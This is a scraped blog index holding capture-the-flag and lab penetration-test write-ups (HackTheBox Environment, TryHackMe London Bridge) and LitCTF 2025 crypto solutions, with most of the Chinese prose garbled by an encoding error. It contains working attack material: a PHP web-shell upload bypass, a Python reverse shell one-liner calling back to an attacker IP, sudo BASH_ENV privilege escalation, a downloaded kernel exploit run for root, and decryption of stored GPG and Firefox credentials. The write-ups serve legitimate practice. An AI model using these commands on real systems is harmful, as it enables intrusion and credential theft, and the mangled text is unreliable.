(ED25519) 80/tcp open http nginx 1.22.1 |_http-title: Did not follow redirect to http://environment.htb |_http-server-header: nginx/1.22.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel python dirsearch.py -u http://environment.htb -w /Users/zsm/CTF/tool/kali_word/dirb/wordlists/big.txt _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 20469 Target: http://environment.htb/ [20:45:45] Scanning: [20:49:52] 301 - 169B - /build -\u003e http://environment.htb/build/ [20:49:52] 301 - 169B - /build -\u003e http://environment.htb/build/ [20:52:23] 200 - 0B - /favicon.ico [20:55:04] 200 - 2KB - /login [20:55:04] 302 - 358B - /logout -\u003e http://environment.htb/login [20:55:10] 405 - 244KB - /mailing [20:58:33] 200 - 24B - /robots.txt [21:00:09] 301 - 169B - /storage -\u003e http://environment.htb/storage/ [21:01:19] 200 - 2KB - /up [21:01:20] 405 - 244KB - /upload [21:01:39] 301 - 169B - /vendor -\u003e http://environment.htb/vendor/ Task Completed æœ‰ä¸ªå¾ˆæ˜æ˜¾çš„ç™»å½•é¡µé¢ï¼Œè¿›å»çœ‹çœ‹ï¼Œéšä¾¿è¾“å…¥è¯•è¯• æœ‰æŠ¥é”™å›æ˜¾ï¼Œä½†æ˜¯ç›®å‰ä¸çŸ¥é“æœ‰ä»€ä¹ˆå¯ä»¥æ‰“çš„åœ°æ–¹ mailingè¿™ä¸ªä¹Ÿå¯ä»¥è®¿é—®ï¼Œå¹¶ä¸”çœ‹è§PHP 8.2.28 â€” Laravel 11.30.0ï¼Œåœ¨ç™»å½•å»æ‰“CVE-2024-52301ï¼Œå¹¶ä¸”è¿™ä¸ªé¡µé¢å¥½åƒå¯ä»¥æ³„æ¼éƒ¨åˆ†æºç çš„ï¼Œä½†æ˜¯æˆ‘æ²¡æ€ä¹ˆçœ‹ï¼Œç›´æ¥æŒ‰ç…§cveçš„æ‰“äº† æˆåŠŸç™»å½•ä¹‹åå‘ç°æœ‰å›¾ç‰‡ä¸Šä¼ çš„åœ°æ–¹ï¼Œä¼ ä¸ªé©¬ä¸Šå»ï¼Œæ³¨æ„*.phpçš„è¯è®¿é—®åªä¼šä¸‹è½½ï¼Œæ‰€ä»¥è¦*.php. ------WebKitFormBoundaryILrUEQYf3y8xqp85 Content-Disposition: form-data; name=\"upload\"; filename=\"zsm.php.\" Content-Type: image/png æˆåŠŸæ‹¿åˆ°è·¯å¾„ {\"url\":\"http:\\/\\/environment.htb\\/storage\\/files\\/zsm.php\",\"uploaded\":\"http:\\/\\/environment.htb\\/storage\\/files\\/zsm.php\"} è¿™ä¸ªé©¬æ˜¯å¯ä»¥ç”¨çš„ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆbashå¼¹ä¸€ç›´å‡ºä¸æ¥ï¼Œæˆ‘å°±ç›´æ¥ç”¨pythonå¼¹äº† python3 -c â€˜import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€œ10.10.16.39â€,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")â€™ å¯ä»¥æ‹¿åˆ°user.txt Connection from 10.10.11.67:44294 www-data@environment:~/app/storage/app/public/files$ ls ls bethany.png hish.png jono.png www-data@environment:~/app/storage/app/public/files$ cd ~ cd ~ www-data@environment:~$ ls ls app html www-data@environment:~$ cd /home cd /home www-data@environment:/home$ ls ls hish www-data@environment:/home$ cd hish cd hish www-data@environment:/home/hish$ ls ls backup root.sh user.txt ","date":"2025-06-02","objectID":"/htb-environment/:2:0","tags":["æ¸—é€"],"title":"HTB Environment","uri":"/htb-environment/"},{"categories":["é¶åœº"],"content":"ææƒ å…ˆææƒåˆ°ç”¨æˆ·hishï¼Œåœ¨backupé‡Œé¢å‘ç°å¥½ä¸œè¥¿ www-data@environment:/home/hish/backup$ ls ls keyvault.gpg æœ‰ä¸ªgpgæ–‡ä»¶ï¼Œæ‰¾äº†ä¸ªé€šç”¨çš„æ–¹æ³• # 1. æ‹·è´ hish ç”¨æˆ·çš„å¯†é’¥ç›®å½• cp -r /home/hish/.gnupg /tmp/mygnupg # 2. è®¾ç½®æƒé™ chmod -R 700 /tmp/mygnupg # 3. ç¡®è®¤æ˜¯å¦å­˜åœ¨ç§é’¥ gpg --homedir /tmp/mygnupg --list-secret-keys # 4. è§£å¯† keyvault.gpg gpg --homedir /tmp/mygnupg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg www-data@environment:~$ ls /tmp ls /tmp message.txt mygnupg systemd-private-71ad283a49be45459b5ebdeb26ff8e08-systemd-logind.service-dwJgyf systemd-private-71ad283a49be45459b5ebdeb26ff8e08-systemd-timesyncd.service-LkFYou vmware-root_499-2117352874 www-data@environment:~$ cat /tmp/message.txt cat /tmp/message.txt PAYPAL.COM -\u003e Ihaves0meMon$yhere123 ENVIRONMENT.HTB -\u003e marineSPm@ster!! FACEBOOK.COM -\u003e summerSunnyB3ACH!! www-data@environment:~$ su hish su hish Password: marineSPm@ster!! è¿™ä¸ªæ—¶å€™å°±æ˜¯ç”¨æˆ·æƒé™äº†ï¼Œå…ˆæ­£å¸¸ä¿¡æ¯æ”¶é›† hish@environment:/var/www$ sudo -l sudo -l [sudo] password for hish: marineSPm@ster!! Matching Defaults entries for hish on environment: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=\"ENV BASH_ENV\", use_pty User hish may run the following commands on environment: (ALL) /usr/bin/systeminfo å…¶ä¸­å¯ä»¥çœ‹åˆ°env_keepä¿ç•™äº†ENVå’ŒBASH_ENVä¸¤ä¸ªç¯å¢ƒå˜é‡å› æ­¤å¯ä»¥ç”¨äºç»•è¿‡ hish@environment:~$ echo 'bash -p' \u003e exp.sh echo 'bash -p' \u003e exp.sh hish@environment:~$ chmod +x exp.sh chmod +x exp.sh hish@environment:~$ sudo BASH_ENV=./exp.sh /usr/bin/systeminfo sudo BASH_ENV=./exp.sh /usr/bin/systeminfo root@environment:/home/hish# id id uid=0(root) gid=0(root) groups=0(root) root@environment:/home/hish# cat /root/* cat /root/* 1ec8b9b660747555f3ee577fc32f3250 cat: /root/scripts: Is a directory ","date":"2025-06-02","objectID":"/htb-environment/:3:0","tags":["æ¸—é€"],"title":"HTB Environment","uri":"/htb-environment/"},{"categories":["é¶åœº"],"content":"æ€»ç»“ çŸ¥é“cveå¾ˆå…³é”®ï¼Œæ„Ÿè§‰æœ‰å¿…è¦å±¯ä¸€ç‚¹cveçš„pocäº†ï¼Œpgpæ–‡ä»¶å¾ˆå…³é”®ï¼Œè¦çŸ¥é“æ€ä¹ˆåšï¼Œæœ€åå°±æ˜¯ç¯å¢ƒå˜é‡çš„ææƒ ","date":"2025-06-02","objectID":"/htb-environment/:4:0","tags":["æ¸—é€"],"title":"HTB Environment","uri":"/htb-environment/"},{"categories":["CTF"],"content":"å‰è¨€ èµ›æ—¶å› ä¸ºæœ‰å…¶ä»–çš„ä¸œè¥¿å°±æ²¡æ‰“ï¼Œèµ›åå¤ç°ï¼Œ25å·ä¸€æ™šä¸Šå†™å®Œäº†ï¼Œæ„Ÿè§‰é™¤äº†èƒŒåŒ…å…¶ä»–çš„éƒ½è¿˜å¥½ ","date":"2025-05-26","objectID":"/litctf2025-crypto/:1:0","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2025-05-26","objectID":"/litctf2025-crypto/:2:0","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"basic task.py from Crypto.Util.number import * from enc import flag m = bytes_to_long(flag) n = getPrime(1024) e = 65537 c = pow(m,e,n) print(f\"n = {n}\") print(f\"e = {e}\") print(f\"c = {c}\") ç»å…¸çš„næ˜¯å¤§ç´ æ•°çš„é—®é¢˜ exp.py n = e = 65537 c = from Crypto.Util.number import* print(long_to_bytes(pow(c,inverse(e,n-1),n))) ","date":"2025-05-26","objectID":"/litctf2025-crypto/:2:1","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"ez_math task.py from sage.all import * from Crypto.Util.number import * from uuid import uuid4 flag = b'LitCTF{'+ str(uuid4()).encode() + b'}' flag = bytes_to_long(flag) len_flag = flag.bit_length() e = 65537 p = getPrime(512) P = GF(p) A = [[flag, getPrime(len_flag)], [getPrime(len_flag), getPrime(len_flag)]] A = matrix(P, A) B = A ** e print(f\"e = {e}\") print(f\"p = {p}\") print(f\"B = {list(B)}\".replace('(', '[').replace(')', ']')) å°±ä¸€ä¸ªé€†å…ƒxd exp.py from sage.all import * from Crypto.Util.number import long_to_bytes e = 65537 p = B = P = GF(p) B = matrix(P, B) phi = p - 1 e_inv = inverse_mod(e, phi) A = B ** e_inv flag_int = A[0,0] flag = long_to_bytes(int(flag_int)) print(flag.decode()) ","date":"2025-05-26","objectID":"/litctf2025-crypto/:2:2","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"baby task.py import gmpy2 from Crypto.Util.number import * from enc import flag m = bytes_to_long(flag) g = getPrime(512) t = getPrime(150) data = (t * gmpy2.invert(m, g)) % g print(f'g = {g}') print(f'data = {data}') ä¸€ä¸ªå¾ˆç»å…¸çš„NTRUé—®é¢˜ $$ data=t*m^{-1} \\mod g \\\\ data*m=t \\mod g \\\\ t=data*m+kg $$é‚£ä¹ˆä¸‹é¢å°±å¯ä»¥é€ æ ¼äº† $$ \\begin{pmatrix} m \u0026 k \\end{pmatrix} \\begin{pmatrix} 1 \u0026 c \\\\ 0 \u0026 g \\end{pmatrix}=\\begin{pmatrix} m \u0026 t \\end{pmatrix} $$ä½†æ˜¯æ³¨æ„é…å¹³ï¼Œæˆ‘æ˜¯ç›´æ¥å°è¯•äº†ä¸€ä¸‹ exp.py import libnum from Crypto.Util.number import* g = h = Ge = Matrix(ZZ,[[1,2**200*h],[0,2**200*g]]) m,t = Ge.LLL()[0] m,t = abs(m),abs(t) print(long_to_bytes(m)) ","date":"2025-05-26","objectID":"/litctf2025-crypto/:2:3","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"mmath task.py from Crypto.Util.number import * from enc import flag m = bytes_to_long(flag) e = 65537 p,q = getPrime(1024),getPrime(1024) n = p*q noise = getPrime(40) tmp1 = noise*p+noise*q tmp2 = noise*noise hint = p*q+tmp1+tmp2 c = pow(m,e,n) print(f\"n = {n}\") print(f\"e = {e}\") print(f\"c = {c}\") print(f\"hint = {hint}\") æ²¡ç»™noiseçš„å€¼ï¼Œå¾ˆæ˜æ˜¾éœ€è¦è‡ªå·±å»åŒ–ç®€ $$ res=hint-n=noise^2+noise(p+q) $$é‚£ä¹ˆæ˜“çŸ¥noiseè‚¯å®šæ˜¯resçš„å› å­ï¼Œfactorä¸€ä¸‹å°±å¯ä»¥æ±‚å‡ºæ¥äº† exp.py n = e = 65537 c = hint = from Crypto.Util.number import * res=hint-n noise=942430120937#factoråˆ†è§£å¾—åˆ°çš„ pq=(res-noise**2)//noise print(pq) from sympy import * p, q = symbols('p q') eq1 = p + q - pq eq2 = p * q - n solutions = solve((eq1, eq2), (p, q)) print(\"p å’Œ q çš„è§£ï¼š\", solutions) p= q=n//p phi=(p-1)*(q-1) print(long_to_bytes(pow(c,inverse(e,phi),n))) ","date":"2025-05-26","objectID":"/litctf2025-crypto/:2:4","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"leak exp.py from Crypto.Util.number import * from enc import flag m = bytes_to_long(flag) p,q,e = getPrime(1024),getPrime(1024),getPrime(101) n = p*q temp = gmpy2.invert(e,p-1) c = pow(m,e,n) hint = temp\u003e\u003e180 print(f\"e = {e}\") print(f\"n = {n}\") print(f\"c = {c}\") print(f\"hint = {hint}\") ç¬¬ä¸€å¼€å§‹è¢«å”¬ä½äº†ï¼Œåé¢å‘ç°å’Œdpé«˜ä½æ²¡åŒºåˆ«çš„ï¼Œç›´æ¥æ‰“å°±è¡Œäº† exp.py from Crypto.Util.number import * import gmpy2 import itertools def small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() print(d) R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m + 1): base = N ^ (m - i) * f ^ i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B * monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return [] e = n = c = leak = leak \u003c\u003c= 180 R.\u003cx,y\u003e = PolynomialRing(Zmod(n),implementation='generic') f = e * (leak + x) + (y - 1) res = small_roots(f,(2^180,2^101),m=2,d=4) print(res) for root in res: dp_low = root[0] dp = leak + dp_low tmp = pow(2,e*dp,n) - 2 p = gmpy2.gcd(tmp,n) q = n // p d = inverse(e,(p-1)*(q-1)) m = pow(c,d,n) print(long_to_bytes(m)) ","date":"2025-05-26","objectID":"/litctf2025-crypto/:2:5","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"new_bag task.py from Crypto.Util.number import * import random import string def get_flag(length): characters = string.ascii_letters + string.digits + '_' flag = 'LitCTF{' + ''.join(random.choice(characters) for _ in range(length)) + '}' return flag.encode() flag = get_flag(8) print(flag) flag = bin(bytes_to_long(flag))[2:] p = getPrime(128) pubkey = [getPrime(128) for i in range(len(flag))] enc = 0 for i in range(len(flag)): enc += pubkey[i] * int(flag[i]) enc %= p f = open(\"output.txt\",\"w\") f.write(f\"p = {p}\\n\") f.write(f\"pubkey = {pubkey}\\n\") f.write(f\"enc = {enc}\\n\") f.close() å¾ˆç»å…¸çš„èƒŒåŒ…é—®é¢˜ï¼Œæœ‰ç‚¹åƒå¤©èä¿¡å®‰2023çš„ä¸€ä¸ªé¢˜ï¼Œä½†æ˜¯ä¸­é—´å¡«å……æ–¹æ³•ä¸ä¸€æ · è¿™ä¸ªæ—¶å€™å°±æœ‰ä¸¤ç§å¤„ç†æ–¹æ³•äº†ï¼Œä¸€ä¸ªæ˜¯å…ˆå¤„ç†ï¼Œä¸€ä¸ªæ˜¯åå¤„ç† åå¤„ç†å°±æ˜¯æŠŠå­—ç¬¦åˆ—å‡ºæ¥ï¼Œç„¶åç›´æ¥å¯»æ‰¾å¯¹åº”ï¼Œæ¯”è¾ƒæš´åŠ› exp.py from Crypto.Util.number import long_to_bytes import re def validate_flag(s): if not s.startswith(b'LitCTF{') or not s.endswith(b'}'): return False allowed_chars = set(b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_') return all(c in allowed_chars for c in s[7:-1]) def attack(p, pubkey, enc, prefix=b'LitCTF{', suffix=b'}'): try: prefix_bits = bin(bytes_to_long(prefix))[2:] for i in range(len(prefix_bits)): enc = (enc - pubkey[i] * int(prefix_bits[i])) % p suffix_bits = bin(bytes_to_long(suffix))[2:].zfill(8) for i in range(-8, 0): enc = (enc - int(suffix_bits[i+8]) * pubkey[i]) % p mid_pubkey = pubkey[len(prefix_bits):-8] n = len(mid_pubkey) Ge = Matrix(ZZ, n + 2, n + 2) for i in range(n): Ge[i, i] = 1 Ge[i, -1] = mid_pubkey[i] Ge[-2, -2] = 1 Ge[-2, -1] = enc Ge[-1, -1] = p for vec in Ge.BKZ(block_size=25): if vec[-1] != 0: continue bits = [] valid = True for x in vec[:-2]: if abs(x) not in (0, 1): valid = False break bits.append('1' if x == 1 else '0') if not valid: continue mid_bits = ''.join(bits) full_bits = prefix_bits + mid_bits + suffix_bits try: flag = long_to_bytes(int(full_bits, 2)) if validate_flag(flag): return flag except: continue return b\"Attack failed: No valid solution found\" except Exception as e: return f\"Error: {str(e)}\".encode() p = pubkey = enc = flag = attack(p, pubkey, enc) print(flag.decode()) è¿™è¾¹ç›´æ¥ç”¨åˆ«äººçš„è„šæœ¬äº†ï¼Œæ‡’å¾—æ”¹äº†ï¼Œè™½ç„¶è¿˜å¯ä»¥ä¼˜åŒ– å…ˆå¤„ç†çš„è¯å°±æ˜¯å…ˆåˆ©ç”¨b'LitCTF{' + b'\\x00'*8 + b'}'æŠŠä»–é¢„å¤„ç†ä¸€ä¸‹ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯å­¦ä¹ dexterå¸ˆå‚…çš„ï¼Œå¾ˆnb from Crypto.Util.number import * from tqdm import * p = pubkey = enc = known = b'LitCTF{' + b'\\x00'*8 + b'}' bin_known = bin(bytes_to_long(known))[2:] for i in range(len(bin_known)): enc -= pubkey[i] * int(bin_known[i]) enc %= p new_pubkey = pubkey[-72:-8] n = len(new_pubkey) d = n / log(max(new_pubkey), 2) print(CDF(d)) for k in trange(256): S = enc + k*p L = Matrix(ZZ,n+1,n+1) for i in range(n): L[i,i] = 2 L[-1,i] = 1 L[i,-1] = new_pubkey[i] L[-1,-1] = S L[:,-1] *= 2^200 for line in L.LLL(): if set(line[:-1]).issubset({-1,1}): m = '' for i in line[:-1]: if i == 1: m += '0' else: m += '1' flag = b'LitCTF{' + long_to_bytes(int(m,2)) + b'}' print(flag) ","date":"2025-05-26","objectID":"/litctf2025-crypto/:2:6","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"æ€»ç»“ é¢˜æ¯”å»å¹´å°‘äº†å¥½å¤šï¼Œä½†æ˜¯è´¨é‡æŒºé«˜çš„ï¼Œå‡ºäº†æœ€åçš„èƒŒåŒ…éƒ½å¾ˆæ–°ç”Ÿ ","date":"2025-05-26","objectID":"/litctf2025-crypto/:3:0","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["é¶åœº"],"content":"å‰è¨€ ä¸€é¼“ä½œæ°”ï¼Œå†åˆ·ä¸€ä¸ªï¼ŒTHMçš„ä¸€ä¸ªä¸­ç­‰é¶æœº ","date":"2025-05-26","objectID":"/thm-the-london-bridge/:1:0","tags":["æ¸—é€"],"title":"THM the London Bridge","uri":"/thm-the-london-bridge/"},{"categories":["é¶åœº"],"content":"å¤–ç½‘æ‰“ç‚¹ nmap -sC -sV 10.10.207.41 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 20:54 CST Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 20:55 (0:00:20 remaining) Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 20:56 (0:00:25 remaining) Stats: 0:01:44 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 20:57 (0:01:08 remaining) Nmap scan report for 10.10.207.41 Host is up (0.23s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA) | 256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA) |_ 256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519) 8080/tcp open http-proxy gunicorn |_http-title: Explore London | fingerprint-strings: | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sat, 24 May 2025 12:55:24 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 2682 | \u003c!DOCTYPE html\u003e | \u003chtml lang=\"en\"\u003e | \u003chead\u003e | \u003cmeta charset=\"UTF-8\"\u003e | \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e | \u003ctitle\u003eExplore London\u003c/title\u003e | \u003cstyle\u003e | body { | font-family: Arial, sans-serif; | margin: 0; | padding: 0; | background-color: #f2f2f2; | header { | background-color: #333; | color: #fff; | padding: 10px 20px; | text-align: center; | background-color: #444; | color: #fff; | padding: 10px 20px; | text-align: center; | color: #fff; | text-decoration: none; | margin: 0 10p | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sat, 24 May 2025 12:55:25 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: HEAD, GET, OPTIONS |_ Content-Length: 0 |_http-server-header: gunicorn 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : ... Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 178.62 seconds æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ï¼Œdisearchå¯åŠ¨ python dirsearch.py -u http://10.10.207.41:8080 -w /Users/zsm/CTF/tool/kali_word/dirb/wordlists/big.txt _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 20469 Target: http://10.10.207.41:8080/ [21:07:24] Scanning: [21:08:23] 200 - 2KB - /contact [21:08:47] 405 - 178B - /feedback [21:08:55] 200 - 2KB - /gallery [21:10:46] 405 - 178B - /upload [21:10:51] 405 - 178B - /view_image Task Completed è®¿é—®view_imageï¼Œå¾—åˆ° Method Not Allowed The method is not allowed for the requested URL. GETä¸è¡Œï¼Œæ¢POSTï¼Œå‘ç°è®©ä½ ä¼ urlï¼Œå¹¶ä¸”ä¼šè§£ææˆimgï¼Œä¼°è®¡æ˜¯æ‰“ssrfçš„ï¼Œffufæµ‹è¯•ä¸€ä¸‹ ./ffuf -u 'http://10.10.207.41:8080//view_image' -w /Users/zsm/CTF/tool/kali_word/dirb/wordlists/big.txt -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'FUZZ=http://10.21.155.141/test' -mc all -t 50 -ic -fs 823 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0 ________________________________________________ :: Method : POST :: URL : http://10.10.207.41:8080//view_image :: Wordlist : FUZZ: /Users/zsm/CTF/tool/kali_word/dirb/wordlists/big.txt :: Header : Content-Type: application/x-www-form-urlencoded :: Data : FUZZ=http://10.21.155.141/test :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: all :: Filter : Response size: 823 ________________________________________________ www [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 544ms] :: Progress: [20469/20469] :: Job [1/1] :: 184 req/s","date":"2025-05-26","objectID":"/thm-the-london-bridge/:2:0","tags":["æ¸—é€"],"title":"THM the London Bridge","uri":"/thm-the-london-bridge/"},{"categories":["é¶åœº"],"content":"ææƒ beth@london:~$ uname -a Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux å†…æ ¸å¾ˆè€äº†ï¼Œå…ˆlinpeas.shå¯åŠ¨(æ‡’å¾—è‡ªå·±æ‰¾cveäº†) [+] [CVE-2018-18955] subuid_shell Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712 Exposure: probable Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28} Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip Comments: CONFIG_USER_NS needs to be enabled æœ¬åœ°dumpä¸‹æ¥ï¼Œé¶æœºä¸‹è½½ wget -r -np -nH --cut-dirs=1 http://10.21.155.141:8000/ beth@london:/tmp/poc$ bash exploit.dbus.sh [*] Compiling... [*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service... [.] starting [.] setting up namespace [~] done, namespace sandbox set up [.] mapping subordinate ids [.] subuid: 100000 [.] subgid: 100000 [~] done, mapped subordinate ids [.] executing subshell [*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf... [.] starting [.] setting up namespace [~] done, namespace sandbox set up [.] mapping subordinate ids [.] subuid: 100000 [.] subgid: 100000 [~] done, mapped subordinate ids [.] executing subshell [*] Launching dbus service... Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken. [+] Success: -rwsrwxr-x 1 root root 8392 May 24 06:50 /tmp/sh [*] Cleaning up... [*] Launching root shell: /tmp/sh root@london:/tmp/poc# id uid=0(root) gid=0(root) groups=0(root),1000(beth) æˆåŠŸæ‹¿åˆ°root root@london:/root# ls -la total 52 drwx------ 6 root root 4096 Apr 23 2024 . drwxr-xr-x 23 root root 4096 Apr 7 2024 .. lrwxrwxrwx 1 root root 9 Sep 18 2023 .bash_history -\u003e /dev/null -rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc drwx------ 3 root root 4096 Apr 23 2024 .cache -rw-r--r-- 1 beth beth 2246 Mar 16 2024 flag.py -rw-r--r-- 1 beth beth 2481 Mar 16 2024 flag.pyc drwx------ 3 root root 4096 Apr 23 2024 .gnupg drwxr-xr-x 3 root root 4096 Sep 16 2023 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile drwxr-xr-x 2 root root 4096 Mar 16 2024 __pycache__ -rw-rw-r-- 1 root root 27 Sep 18 2023 .root.txt -rw-r--r-- 1 root root 66 Mar 10 2024 .selected_editor -rw-r--r-- 1 beth beth 175 Mar 16 2024 test.py ","date":"2025-05-26","objectID":"/thm-the-london-bridge/:3:0","tags":["æ¸—é€"],"title":"THM the London Bridge","uri":"/thm-the-london-bridge/"},{"categories":["é¶åœº"],"content":"ç¬¬ä¸‰ä¸ªè´¦æˆ·çš„å¯†ç  root@london:/root# ls /home beth charles root@london:/root# cd /home/charles/ root@london:/home/charles# ls root@london:/home/charles# ls -la total 24 drw------- 3 charles charles 4096 Apr 23 2024 . drwxr-xr-x 4 root root 4096 Mar 10 2024 .. lrwxrwxrwx 1 root root 9 Apr 23 2024 .bash_history -\u003e /dev/null -rw------- 1 charles charles 220 Mar 10 2024 .bash_logout -rw------- 1 charles charles 3771 Mar 10 2024 .bashrc drw------- 3 charles charles 4096 Mar 16 2024 .mozilla -rw------- 1 charles charles 807 Mar 10 2024 .profile root@london:/home/charles# cd .mozilla root@london:/home/charles/.mozilla# ls -la total 12 drw------- 3 charles charles 4096 Mar 16 2024 . drw------- 3 charles charles 4096 Apr 23 2024 .. drw------- 3 charles charles 4096 Mar 16 2024 firefox root@london:/home/charles/.mozilla# cd firefox/ root@london:/home/charles/.mozilla/firefox# ls -la total 12 drw------- 3 charles charles 4096 Mar 16 2024 . drw------- 3 charles charles 4096 Mar 16 2024 .. drw------- 16 charles beth 4096 Mar 16 2024 8k3bf3zp.charles è¿™ä¸ªä¸œè¥¿ä»¥å‰æ²¡æœ‰é‡åˆ°è¿‡ï¼Œä¸»è¦æ˜¯ç«ç‹æµè§ˆå™¨çš„ä¿¡æ¯æ¢å¤ï¼Œå¯ä»¥åœ¨ç½‘ä¸Šæ‰¾åˆ°è„šæœ¬å»æ¢å¤ï¼Œå…ˆå§æ–‡ä»¶dumpåˆ°æœ¬åœ° tar -cvzf /tmp/firefox.tar.gz firefox scp -i id_rsa beth@10.10.207.41:/tmp/firefox.tar.gz . ç„¶åå»è¿è¡Œè„šæœ¬æ¢å¤ python3 firefox_decrypt/firefox_decrypt.py firefox/8k3bf3zp.charles â”€â•¯ 2025-05-24 22:00:27,307 - WARNING - profile.ini not found in firefox/8k3bf3zp.charles 2025-05-24 22:00:27,307 - WARNING - Continuing and assuming 'firefox/8k3bf3zp.charles' is a profile location Website: https://www.buckinghampalace.com Username: 'Charles' Password: 'thekingofengland' ","date":"2025-05-26","objectID":"/thm-the-london-bridge/:4:0","tags":["æ¸—é€"],"title":"THM the London Bridge","uri":"/thm-the-london-bridge/"},{"categories":["é¶åœº"],"content":"æ€»ç»“ è¿™ä¸ªé¶æœºä¸»è¦æ˜¯ä¿¡æ¯æ”¶é›†å’Œssrfï¼Œææƒéƒ¨åˆ†å¹¶æ²¡æœ‰ç‰¹åˆ«å¤šèŠ±é‡Œèƒ¡å“¨çš„æ“ä½œï¼Œä¸»è¦æ˜¯æ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½æ¯”è¾ƒå€¼å¾—æ³¨æ„ï¼Œä½ ä¹Ÿä¸æƒ³æ–‡ä»¶éƒ½dumpä¸ä¸‹æ¥å§ï½ ","date":"2025-05-26","objectID":"/thm-the-london-bridge/:5:0","tags":["æ¸—é€"],"title":"THM the 